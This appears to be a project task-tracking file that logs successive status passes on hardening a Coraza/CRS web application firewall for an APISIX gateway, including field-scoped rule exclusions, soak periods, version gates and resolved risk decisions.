> **Deploy baseline still `e337f83`** — T4.2.1's plugin_config edit remains uncommitted for user
> review, and this pass changed no infrastructure file at all (verification + TASKS.md only). The
> `GATEWAY_IMAGE_TAG` ≥ `v2026.6` ship gate on T4.2.1 still applies.

> **Recomputed 2026-08-03 (fourteenth pass).** T4.2.1 [deploy] done — the four blanket
> `ctl:ruleRemoveById` blocks in `03-secured-api.json` are now field-scoped
> `ctl:ruleRemoveTargetById`; the file's blanket-removal count drops **57 → 2** (both survivors are
> `931130`, which inspects a CRS-internal TX variable and cannot be field-scoped). **The thirteenth
> pass's caution below is retracted**: field-scoping is not merely achievable, it is verified. The
> shipped gateway is Coraza **v3.7.0** / CRS **4.25.1**, read out of the wasm binary itself
> (`corazawaf/coraza/v3@v3.7.0`, `crs_setup_version=4251`, `_initialize` present) rather than
> inferred from the image tag — the 2026-07-01 "unreliable on this build" finding was a v3.3.3
> version gap that G1 closed. Proven on an isolated enforce-mode harness: same payload suppressed in
> `json.message` but still firing in `json.topic_id`, in a cookie, in `Referer`, in `User-Agent` and
> in a query arg; and the whole T4.1.2 FP corpus produces **rule-ID-identical** results before and
> after the rewrite, so no suppression was lost. Scope was widened with user approval from the 2
> named blocks to 4 (`id:199100`/`id:199121` had picked up the same four prose rules on 2026-08-01),
> and a third DetectionOnly soak pair (`id:199132`) was added to keep BR-WAF-011 satisfied for the
> two newly-in-scope POST routes.
> **Newly Ready now: T4.2.2 and T4.2.3 [deploy]** — both depended only on T4.2.1. Note both are
> confirmation-only tasks and T4.2.1's harness run already produced their evidence (920370 fires on a
> 5000-char `message` but not a 3900-char one, and `920390` never fires; headers/cookies/query args
> demonstrably regained inspection). Whoever picks them up should decide whether to close on that
> evidence or re-confirm against a live authenticated stack — worth knowing that **body-level WAF
> probing on `apisix-dev` requires a real session**, because `openid-connect` 401s an unauthenticated
> request at the access phase before Coraza's body phase ever runs.
> **G4 stays open on G4.2 only**, now pending T4.2.2/T4.2.3. Ready now [deploy] otherwise unchanged:
> the parked **T6.3.4 / T7.7.2**. **[backend]/[frontend]/[specs]: none.**
> **Deploy baseline NOT bumped** — T4.2.1's edit is uncommitted in the working tree for user review,
> per this repo's norm for WAF exclusion edits; `haisir-deploy` HEAD remains `e337f83`. **When it does
> ship, it must not go out ahead of a `GATEWAY_IMAGE_TAG` ≥ `v2026.6`** — the field-scoped form
> matches nothing on Coraza < v3.5.0 and fails silently.

> **Recomputed 2026-08-03 (thirteenth pass).** T4.1.2 [deploy] done — **G4.1 CLOSED**. See the
> top-of-file banner and T4.1.2's own task note for full methodology/evidence (a live dev-stack
> soak substituting for staging/prod real traffic, 2 real gaps found and fixed, committed and pushed
> as `e337f83`). **T4.2.1 [deploy] is now Ready now** — its only remaining dependency (T4.1.2) is
> done, and T3.2.5 [frontend] was already done 2026-07-30. Flag for whoever picks this up: T4.1.2's
> fixes stayed blanket-style, consistent with the existing 2026-07-01 finding that field-scoped
> `ctl:ruleRemoveTargetById` is unreliable on this Coraza WASM build — T4.2.1 may need to revisit
> whether a field-scoped rewrite is achievable at all before attempting one. **G4 stays open** on
> G4.2 (T4.2.1) only — G4.1/G4.3/G4.4/G4.5 are all now closed. Ready now [deploy] otherwise unchanged
> from the twelfth pass: **T4.2.1** (new), plus the parked **T6.3.4 / T7.7.2**. **[backend]/
> [frontend]/[specs]: none.**

> **Recomputed 2026-08-03 (twelfth pass — reconciliation only, no new task work).** Verified every
> sibling repo's actual `origin/main` against this file's task notes (see the top-of-file banner for
> full detail): the deploy WAF edits for T2.3.2/T4.1.1/T4.3.1–T4.3.3/T4.4.1/T4.5.1 and the G7.1
> backend test are all confirmed committed and pushed, closing out every "left uncommitted" caveat
> that predates this pass. **No task's checkbox state changes and no new task unblocks** — commit
> status isn't a dependency edge in this file's graph. Exhaustively re-walked all 18 remaining
> unchecked leaf tasks (`T4.1.2`, `T4.2.1–T4.2.3`, `T5.3.2`, `T5.4.1–T5.4.2`, `T6.3.4`, `T7.4.2`,
> `T7.7.2`, `T8.1.1–T8.1.3`, `T8.2.1–T8.2.2`, `T8.3.1–T8.3.3`) against their listed dependencies:
> every one is correctly parked below — either sequentially blocked, waiting on live-stack/real-traffic
> access this session doesn't have, waiting on a scope/product decision, or hard-gated behind G8.
> **None are ready-but-mislabeled.** Ready now stays exactly: **[deploy] T4.1.2** (soak, not
> single-session-completable) plus the parked **T6.3.4 / T7.7.2**. **[backend]/[frontend]/[specs]:
> none.**

> **Recomputed 2026-08-03 (eleventh pass).** T4.5.2 [backend] done — committed `e2e0f0f` and pushed
> to `origin/main` (real-service PATCH URL-enforcement regression tests; no production code change,
> the guard already existed at the service layer). All three G4.5 children now done (T4.5.1, T4.5.2,
> T4.5.3) → **G4.5 CLOSED** (acceptance: every surviving exclusion is field-scoped and truthfully
> justified — verified by the deploy-side T4.5.1/T4.5.3 work plus T4.5.2's backend parity). No new
> task unblocks as a direct result — nothing in TASKS.md depends on G4.5 or T4.5.2. **G4 stays open**
> on G4.1 (T4.1.2 soak) and G4.2 (T4.2.1) only. **Currently Ready now [backend]: none** (T4.5.2 was
> the last freely-ready backend task). Ready now [deploy] unchanged: T4.1.2, plus the parked
> T6.3.4 / T7.7.2 (scope/product decisions). Backend baseline bumped to `e2e0f0f`.

> **Recomputed 2026-08-02 (tenth pass).** T4.4.2 [deploy] done — **G4.4 CLOSED** (T4.4.1 + T4.4.2
> both done; the 4/4 disposable-harness run is the gate's integration test). The verification also
> caught + fixed a deployment-breaking `desc`-length bug in T4.4.1's own edit (routes 21/22 `desc`
> was 404 chars > APISIX's 256 limit → admin API rejected the route PUT → routes would have
> silently failed to load and fallen through to route 19's loose schema, the exact BR-WAF-012
> failure; corrected to ≤256). No new task unblocks as a direct result of G4.4 closing — T4.2.1
> (the `id:199110`/`id:199120` field-scoped rewrite) is still gated behind T4.1.2's real-traffic
> soak, not G4.4. **G4 stays open** on G4.1 (T4.1.2 soak), G4.2 (T4.2.1), G4.5 (T4.5.2 [backend]).
> **Currently Ready now [deploy]: T4.1.2** (the soak — not single-session-completable, same shape
> as T2.3.2) plus the parked **T6.3.4 / T7.7.2** (scope/product decisions). **[backend]: T4.5.2**
> (dependency-free, the only remaining G4.5 child).

> **Recomputed 2026-08-02 (ninth pass).** T4.4.1, T4.5.1, T4.5.3 [deploy] all done this pass (see
> task notes above). **T4.4.2 [deploy] newly unblocked** — its only dependency was T4.4.1, now
> done; it verifies the intended `body_schema` is the one actually enforced on the two exact-URI
> hAITU routes now that they outrank the `/api/haitu/*` wildcard. G4.4 stays open on T4.4.2.
> G4.5 stays open on **T4.5.2 [backend]** (dependency-free, the only remaining G4.5 child) — the
> deploy-side exclusion-hygiene work for G4.5 is complete (T4.5.1 + T4.5.3); what's left is a
> backend parity fix in `TopicContentUpdate.validate_url`. No parent gate closes this pass:
> G4.4 (T4.4.2 open), G4.5 (T4.5.2 open), G4 (G4.1/G4.2/G4.4/G4.5 open).

> **Recomputed 2026-08-02 (eighth pass).** T4.1.1, T4.3.1, T4.3.2, T4.3.3, T4.3.4 all done since the
> seventh pass (see task notes above and the top-of-file banners). **G4.3 is now CLOSED** —
> live-verified via a disposable isolated-stack harness (adapted `waf-harness.sh`'s pattern, no real
> secrets touched): threshold restored to 5, surviving field exclusions still suppress their FPs
> individually and combined, `image_url` now genuinely protected, unrelated attacks still blocked.
> Nothing else depends on G4.3 closing, so no further task unblocks as a direct result.
> **Currently Ready now: T4.1.2** [deploy] (depends on T4.1.1, done) — the BR-WAF-011 soak's
> log-collection step; needs a real-traffic review window on staging/prod, not completable in a
> single session, same shape as T2.3.2. Closes G4.1, which T4.2.1 (the actual `id:199110`/`id:199120`
> field-scoped rewrite) depends on.
> **Also newly surfaced this pass, not evaluated in any recompute since G2 closed:** T4.4.1 [deploy]
> (route-priority fix, `21-api-haitu-exam-review.json`/`22-api-haitu-pattern-analysis.json` above
> `19-api-haitu.json`) and T4.5.1/T4.5.3 [deploy] (exclusion-hygiene: `931130` justification
> correction, re-scoping the `18-api-exam-session-submit.json`/`01`/`02`/`04` exclusions) — both
> carry **no listed dependency** in TASKS.md and aren't blocked by G4.1/G4.2/G4.3 (independent
> workstreams under the same G4 parent per PLAN.md's goal tree, not a sequential chain). T4.5.2 is
> [backend], also dependency-free. These were previously excluded wholesale only because "all of G4"
> was hard-gated behind G2; now that G2 has closed, they haven't individually been picked up yet —
> flagging rather than silently deferring again.

> **Recomputed 2026-08-01 (seventh pass).** T2.3.2 done — see its task note above for full evidence.
> Result: **not zero blocks**, three real Coraza findings recorded (942200 systemic across 3 routes;
> 932240/942120 missing from the hAITU 199110 exclusion; topics-contents/parent-content-creation
> text field has zero coverage). **G2.3 stays open** — its acceptance criterion ("benign corpus
> passes") is not met by this evidence, so G2 (hard gate on G4) stays open too. This surfaces a real
> structural tension: the fixes these findings need are G4.2/G4.5-shaped work, but G4 can't start
> until G2 closes, and G2 can't honestly close until these are fixed. Not resolved unilaterally —
> flagged for a scope/ordering decision. No other task unblocks as a result of T2.3.2 landing, since
> its result didn't satisfy G2.3's pass condition.

> **Recomputed 2026-07-31 (fifth pass)** — the previous list was stale: **T3.5.3 and T6.2.3
> [backend] were already done** (both closed 2026-07-31, see task notes above) but still listed
> below. Removed. Checked every remaining unchecked leaf task in the file: T2.3.2, T5.3.2, T5.4.1,
> T5.4.2, T6.3.4, T7.4.2, T7.7.2 — every single one is individually flagged blocked, either pending
> a scope/product decision or live-stack/staging access this session doesn't have. Per instruction,
> these are parked below and not treated as "ready now." **The only actionable work left is closing
> gate rows whose child tasks are all already done but whose own gate line is still unchecked** —
> not new work, a verify-and-check-off pass against evidence already recorded in the task notes
> above.

**Closed this pass (2026-07-31, sixth pass)** — G3.1, G3.3, G3.5, G3.6, G5.2, G6.2, G7.6 all
checked off above; see the top banner and each gate's own line for evidence. No code changed.

**Closed this pass (2026-08-01)** — G7.1: added a real over-the-wire chunked-encoding test,
verified it fails without the fix; see its own line above for evidence. Uncommitted in the
`backend` devcontainer — needs a commit before it counts as landed.

**Closed this pass (2026-08-01, later): G2.3 → G2, the G4 hard gate, now cleared.** All three
T2.3.2 findings fixed and live-verified (see G2.3's task note above for full evidence) —
`SecRuleUpdateTargetById`/`ctl:ruleRemoveById` additions to `03-secured-api.json` (findings 2/3,
per-route) and to all four plugin_configs (finding 1, `942200`'s startup-time global exclusion).
**This is the concrete unblock: G4 is no longer hard-gated.** Specifically:
- **T4.1.1 [deploy] is now Ready now** — its only dependency was `G2`, now satisfied. Sets
  `SecRuleEngine DetectionOnly` on the affected URIs per BR-WAF-011 (the mandated soak-before-
  enforcement step — removing a blanket exclusion before its field-scoped replacement is proven to
  fire would 403 live traffic).
- The rest of G4 stays sequentially gated behind that soak, not by G2 anymore: T4.1.2 depends on
  T4.1.1; T4.2.1 (the actual field-scoped rewrite of `id:199110`/`id:199120`) depends on T4.1.2 (and
  the already-done `T3.2.5` [frontend]); T4.3.x (exam authoring route cleanup) depends on the
  already-done `T3.5.4`/`T3.5.1` [frontend] and has no G4.1 dependency, so **T4.3.1 is also Ready
  now** in parallel with T4.1.1.
- **G8** stays excluded (hard-gated on G1–G7, and G7 itself is still blocked on G7.4/G7.7 below).

**Not yet unlockable**
- G3 overall [backend, frontend, deploy]: G3.1/G3.3/G3.5/G3.6 now closed, but G3.2 and G3.4 remain
  blocked (see below) — G3 can't close until those two do.

**Parked / blocked — excluded above per your instruction to skip these for now**
- G3.2 [backend, frontend], G3.4 [backend]: both need a live-backend smoke test not available this
  session
- T5.3.2/T5.4.1/T5.4.2 [frontend] and G5.3/G5.4/G5: chained behind the deploy-owned live-stack
  Keycloak OIDC soak (BR-CSP-007)
- ~~T6.3.4 [deploy] and G6.3/G6: blocked on the Postgres-TLS scope decision~~ — **resolved
  2026-08-04** as an accepted risk with a CI-enforced invariant; G6.3 and G6 both closed
- T7.4.2 [deploy] and G7.4: chained behind T5.4.1 above
- ~~T7.7.2 [deploy] and G7.7: blocked on the `enable_admin_ui` product decision~~ — **resolved
  2026-08-04**, dashboard disabled for staging/prod; G7.7 closed
- G7 [deploy, backend, frontend] overall: blocked via G7.4 above (G7.7 closed 2026-08-04)
- **G8** (hard-gated on G1–G7): excluded, as before

<details>
<summary>Superseded — previous (stale) Ready Now pass, kept for history</summary>

> T7.5.3 done, closing **G7.5** (T7.5.1–T7.5.4 all done).
> Removed from Deploy below. Nothing depends on T7.5.3, so no further tasks unblock. **G7 stays
> open** — G7.1, G7.4, G7.6, G7.7 all still have unchecked children/gates.
> **Recomputed 2026-07-31 (latest)** — T7.5.1/T7.5.2 done (see task notes above). **T7.5.3 newly
> unblocked** (depends on T7.5.2, now done) — remains in Deploy below, ready to start. G7.5 stays
> open pending T7.5.3.
> **Recomputed 2026-07-31 (later)** — T7.3.2 done, closing **G7.3** (both children T7.3.1/T7.3.2
> done, acceptance test passed on `jq` validation — see task note; live re-verification still
> pending the Admin Console paste step). Removed from Deploy below. Nothing depends on T7.3.2, so
> no further tasks unblock. **G7 stays open** — G7.1, G7.4, G7.5, G7.6, G7.7 all still have
> unchecked children/gates.
> **Recomputed 2026-07-31** — T7.3.1 and T7.5.4 done (see task notes above). G7.5 stays open — it
> still has other unchecked children (T7.5.1–T7.5.3).
> Recomputed 2026-07-30 (**G6.4 closed** — T6.4.1–T6.4.4 all done: Keycloak `passwordPolicy`,
> `sslRequired: external`, explicit brute-force params all landed in `01-realm.json`; T6.4.4's MFA
> question evaluated and deliberately deferred (recorded in `decisions.md`), not left undone.
> Nothing else depends on T6.4.2–T6.4.4 individually, so no new deploy tasks unblock — **G6 stays
> open** pending G6.1 (deploy+backend), G6.2 (backend), G6.3 (deploy). Earlier same day: fixed a
> stale bookkeeping error found while recomputing: T7.2.2 was already `[x]` done (2026-07-29) but
> was still listed here as ready — removed. Earlier same day: **G2.2 closed** — T2.2.1–T2.2.3 all
> done: target-scoped `ctl:ruleRemoveTargetById` proven to suppress only the named `ARGS_POST` field
> (headers/cookies/query args/other body fields stay inspected), and the before/after is recorded
> in `16_gateway_waf.md`. **T2.3.1 done** — all three real WAF suites run against the fixed image
> on a disposable harness (21/24, 14/14, 14/14; the 3 shortfalls confirmed not regressions — see
> T2.3.1's note). **T2.3.2 unblocked** as a result and is what closes G2.3 → G2, the hard gate on
> G4 — but it needs a **real-traffic benign corpus**, not a throwaway harness, so it's parked
> pending staging/live-stack access rather than something runnable in isolation. Earlier basis same day: **T1.3.4 closed** — the gateway image now demonstrably filters, verified 4/4 by
> `common/scripts/tests/waf-harness.sh`; gates **G1.3 and G1 re-closed** on that evidence.
> **T2.3.1 unblocked** as a result and is the highest-value deploy task left — G2 is a hard gate on
> G4. T2.2.1 done, and its v2026.4 caveat discharged against the fixed image.) Earlier basis:
> T2.1.1/T2.1.2 done, G2.1 closed, T3.2.2–T3.2.4/T3.2.3a and T3.4.1 landed.
> **Caveat:** entries below with no listed
> `Depends on` in TASKS.md are included on a literal read of the dependency annotations — they have
> not all been individually re-verified against PLAN.md's prose goal tree. Excluded throughout: all
> of **G4** (explicit hard gate at G2, not yet done) and all of **G8** (closeout — "the full diff",
> meaningless before G1–G7 finish, even though some of its tasks list no explicit per-task
> dependency). Also excluded: T5.3.2/T5.4.1 — literally unblocked by T5.3.1/T5.3.3 landing, but each
> carries an explicit BR-CSP-007 "MUST NOT proceed" note pending the deploy-owned live-stack soak.

**Backend**
- T3.5.3 [backend]: Migrate existing base64 `image_url` values in `questions` to stored files + paths (depends on T3.5.2, done 2026-07-31)
- T6.2.3 [backend]: Regression test — a token minted for a different realm client is rejected with 401 (depends on T6.2.2, done 2026-07-31) — note: `test_invalid_audience_raises_401` added under T6.2.2 already exercises the wrong-audience→401 path, so this may already be satisfied; confirm before doing it separately

**Frontend**
> T3.3.2 done 2026-07-30; T3.5.4 done 2026-07-31; T3.5.5 done 2026-07-31 (was briefly reopened
> same day after `a72ddcf` shipped a proxy route pointed at the wrong backend path — `06600f6`
> (frontend) + `394f1b2` (backend) fixed it properly, see task note above). T5.3.2/T5.4.1 remain
> held for the deploy-owned live-stack soak (BR-CSP-007).

**Deploy**
> 2026-07-31: T3.2.6, T6.1.2, T6.3.1, T6.3.2, T6.3.3, T7.3.1, T7.3.2, T7.4.1, T7.5.4, T7.6.2, T7.7.1,
> T7.7.3, T7.7.4, T7.7.5 all done (see task notes above). **G7.3 now closed** (T7.3.2 was its last
> open child). T6.3.4 and T7.7.2 were in the same batch but deliberately skipped: both need a
> scope/product decision from the user rather than a mechanical fix (T6.3.4: Postgres has no TLS at
> all, fixing it properly means standing up server-side TLS, bigger than the task as scoped; T7.7.2:
> an explicit "decide whether X is warranted" call). Both remain listed below pending that decision.
> 2026-08-01: T4.1.1 and T4.3.1 done (see task notes above). T2.3.2 (done 2026-07-31/2026-08-01,
> see task note) removed from this list — stale carry-over from an earlier recompute pass.
> 2026-08-02: T4.3.2/T4.3.3/T4.3.4 done, **G4.3 closed** (see task notes above). Removed from this
> list — nothing else depends on G4.3 closing.
> 2026-08-03: T4.1.2 done (**G4.1 closed**) and T4.2.1 done — both removed from this list.
> 2026-08-03 (later): T4.2.2 and T4.2.3 done, both PASS — removed from this list. **G4.2 did not
> close** (see its gate note above); T4.2.4 opened in their place.
> 2026-08-03 (later still): T4.2.4 done — removed from this list. The adversarial pass rejected its
> original one-line scoping and shipped exclusion + compensating rule `id:199140` instead.
> 2026-08-04: **T6.3.4 and T7.7.2 both resolved, closing G6.3, G6 and G7.7** — the two long-parked
> decisions. T6.3.4: accepted risk (no Postgres TLS), because every container on `haisir-net` drops
> `ALL` caps, so neither passive sniffing nor ARP-spoof MITM of the DB channel is reachable from a
> compromised neighbour — now CI-guarded. T7.7.2: disable the admin dashboard, with the static-key
> residual (which is an Admin *API* property, not a UI one) documented as accepted risk. Both
> removed from this list; deploy commit `602d155` on branch `security/close-t6.3.4-t7.7.2`.
> **G7 stays open on G7.4** (header ownership) — nothing else in G7 was waiting on these two.
- T4.2.5 [deploy]: Remove the `id:199130`/`199131`/`199132` DetectionOnly soak blocks, restoring enforcement (depends on T4.2.4, done 2026-08-03) — **NOT ready**: BR-WAF-011 requires T4.2.1/T4.2.4's changes to be deployed and observed on a real environment first, and that needs a release carrying `GATEWAY_IMAGE_TAG` ≥ `v2026.6`, which does not exist yet. This is the last blocker on G4.2 and therefore on G4.

**Specs**
- _(none)_ — T7.5.1/T7.5.2 done 2026-07-31 (see task notes above).

</details>
